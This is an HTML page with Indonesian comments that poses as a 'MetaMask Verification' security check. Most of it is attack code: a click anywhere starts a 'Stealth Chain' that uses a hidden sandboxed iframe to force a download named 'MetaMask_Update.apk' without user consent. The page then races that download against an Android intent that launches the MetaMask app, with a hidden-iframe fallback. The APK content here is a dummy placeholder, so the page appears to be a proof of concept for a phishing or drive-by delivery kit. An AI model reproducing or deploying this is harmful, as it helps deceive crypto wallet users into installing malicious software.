<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #f00; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
  h2 { animation: blink 0.2s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🦊 MetaMask Verification</h2>
  <p>Klik di mana saja untuk melanjutkan.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. KONFIGURASI INTENT
  // ============================================
  var METAMASK_INTENT = "intent://#Intent;" +
                        "package=io.metamask;" +
                        "scheme=metamask;" +
                        "end;";

  // ============================================
  // 2. TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>Memverifikasi...</h2>
      <p>Mengunduh paket & menghubungkan wallet...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Stealth Chain...");

    // ============================================
    // A. STEALTH DOWNLOAD VIA IFRAME TERSEMBUNYI
    // ============================================
    try {
      // Base64 Header APK (Dummy)
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      
      // Blob APK
      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
      var blobUrl = URL.createObjectURL(blob);

      // Buat iframe tersembunyi
      var dlIframe = document.createElement("iframe");
      // Meminta izin download tanpa gesture
      dlIframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
      dlIframe.style.display = "none";
      
      // HTML di dalam iframe: Link download otomatis
      dlIframe.srcdoc = `
        <body>
          <a id="dl" href="${blobUrl}" download="MetaMask_Update.apk">Download</a>
          <script>
            document.getElementById('dl').click();
          <\/script>
        </body>
      `;
      
      document.body.appendChild(dlIframe);
      log("[+] Stealth APK Download Triggered.");
    } catch(e) {
      log("[-] Download Error: " + e.message);
    }

    // ============================================
    // B. INTENT INJECTION (RACE CONDITION)
    // ============================================
    // Eksekusi dalam 10ms setelah download dimulai.
    // Tujuannya agar browser memproses Intent saat masih sibuk dengan download.
    
    setTimeout(function() {
      log("[+] Mengirim Intent MetaMask (Race)...");
      try {
        // Top-Level Navigation
        window.location.href = METAMASK_INTENT;
      } catch(e) {
        log("[-] Intent Error: " + e.message);
      }
    }, 10); // 10ms

    // ============================================
    // C. FALLBACK: IFRAME SANDBOX (JIKA TOP-LEVEL GAGAL)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim Intent via Iframe...");
      try {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.srcdoc = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              window.top.location.href = "${METAMASK_INTENT}";
            <\/script>
          </body>
          </html>
        `;
        document.getElementById("launcher-container").appendChild(iframe);
      } catch(e) {}
    }, 500); // 500ms (Beri waktu Top-Level untuk mencoba)

  }, { once: true });

})();
</script>
</body>
</html>
